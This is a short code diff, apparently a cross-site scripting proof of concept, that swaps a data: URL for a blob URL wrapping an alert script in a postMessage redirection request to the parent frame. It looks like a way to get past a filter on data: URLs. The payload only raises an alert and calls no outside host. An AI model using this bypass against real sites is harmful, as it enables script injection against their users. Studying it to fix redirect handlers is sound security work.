@@ -1,6 +1,10 @@
 <script>
+const payload = `<script>alert('XSS via blob')</script>`;
+const blob = new Blob([payload], { type: 'text/html' });
+const blobUrl = URL.createObjectURL(blob);
+
 parent.postMessage({
     action: "requestRedirectionTo",
-    targetUrlStr: "data:text/html,<script>alert('XSS')</script>"
+    targetUrlStr: blobUrl
 }, "*");
 </script>
